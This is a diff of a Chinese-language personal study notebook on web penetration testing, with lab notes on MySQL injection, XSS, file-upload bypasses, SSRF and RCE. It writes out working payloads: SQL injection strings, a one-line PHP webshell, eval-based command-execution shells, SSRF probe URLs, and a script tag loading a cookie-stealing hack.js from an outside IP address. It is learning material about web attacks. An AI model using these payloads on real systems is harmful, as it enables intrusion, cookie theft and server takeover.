@@ -1,5 +1,3 @@
-	
-	
 域名与IP地址
 	一个IP地址可以有多个域名，一个域名只能指向一个IP地址。
 	如：
@@ -39,7 +37,7 @@
 	
 2023.10.9 MySql注入
 	判断注入：
-		老办法：and 1=1 页面正常	and 1=2 错误
+		老办法：and 1=1 --+页面正常	and 1=2--+ 错误
 	now：
 		1.猜字段数order by 1、order by 2、order by 3......猜到页面错误（此步骤判断注入）  order by是根据字段排序
 		2.union select 1,2,3 (直到字段数) 用数字容易出现类型不兼容的异常，数字可换成null替代
@@ -59,6 +57,7 @@
 		load_file('xxxxxxx')	读取函数	
 		into outfile 或 into dumpfile 写入函数
 		
+
 	把注入语句中的'xxxxxxx'字符串换成16进制可以绕过某些简单的SQL注入过滤器和php魔法引号；
 	MySql的关键字不区分大小写，可以利用这个绕过简单的关键词过滤，如select可以改成SelecT；大多数DBMS（数据库管理系统）对于SQL语句的关键字和标识符是不区分大小写的
 
@@ -80,6 +79,7 @@
 	接着进入账号xiaomi'# 更改密码为88888888 此时后台的sql语句就变成 update password='88888888' where username='xiaomi' #' and password='1231321'
 	此时，橙色的语句就被注释掉了，即该语句把xiaomi的密码改了而xiaomi'#的密码不变
 	
+
 	堆叠注入：
 	就是利用;号写多个sql语句，有局限性，有些数据库支持执行多个语句，有些不行
 	
@@ -90,7 +90,7 @@
 ---------------------------
 	xss获取cookie，http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=<script src="http://127.0.0.1/DVWA/vulnerabilities/xss_r/hacker.js" /></script>
 	利用xss漏洞，受害者点击链接就会访问目标网站，并且会加载<script src="http://127.0.0.1/DVWA/vulnerabilities/xss_r/hacker.js" /></script>这段代码，此时hacker.js就可以获取受害者在目标网站的cookie，并将cookie发送到我的网站。
-		
+
 数据通信网络基础
 
 	网络通信：终端设备之间通过计算机网络进行的通信
@@ -125,7 +125,7 @@
 	总的来说，这种技巧利用了Windows文件系统的特性和PHP的解析方式，绕过了一些基本的文件上传黑名单检测，使得攻击者可以上传并执行恶意PHP代码。
 	
 	抓包把文件名改成1.php/. 看似这成了文件夹的名字，实则还是会保存为1.php文件；这可绕过某些后缀名检测，1.php/.jpg 系统也会保存php文件而不是jpg，代码会以为后缀是.jpg，可绕过白名单检测
-	
+
 图片马制作
 一句话木马：
 <?php eval($_POST['cmd']); ?>//执行php代码
@@ -191,7 +191,55 @@ CSRF则可以诱导受害者在多个网站操作
 
 <script src='http://39.96.44.170/hack.js'></script>
 
-XSS工具：beef、github_XSS-payload
+XSS工具：beef、github_XSS-payload、XSStrike
 
 HttpOnly
 如果您在cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookiet信息，这样能有效的防止SS攻击
+
+进入后台两种方式：
+1.获取coookie进入后台
+2.直接账号密码登录
+
+&#x4e2d;&#x56fd;中国
+&#是html的转义序列，不是编码，payload用这个转义也是一种绕过方法
+
+#XSS常规WAF绕过思路
+标签语法替换
+特殊符号干扰
+提交方式更改
+垃圾数据溢出
+加密解密算法
+结合其他漏洞绕过
+
+CSRF（跨站请求伪造）
+
+SSRF（服务器端请求伪造）
+伪协议、各个协议调用探针：http,file,dict,ftp,gophers等
+
+学习链接https://blog.csdn.net/unexpectedthing/article/details/121276653
+
+漏洞攻击：端口扫描，指纹识别，漏洞利用，内网探针等
+http://192.168.64.144/phpmyadmin/
+file:///D:/www.txt
+dict://192.168.64.144:3306/info
+ftp://192.168.64.144:21
+
+RCE指两个漏洞，代码及命令执行漏洞
+
+<?php
+eval($REQUEST[x])
+?>
+x是代码执行
+<?php
+eval(echo `$REQUEST[x]`)
+?>
+x是代码执行，仅限于Linux系统，Windows不支持反引号``
+
+WTS-waf
++号替代空格可以绕过waf
+
+文件包含
+php包含函数会把被包含文件当作php脚本执行，所以会识别被包含文件中的php代码
+
+
+
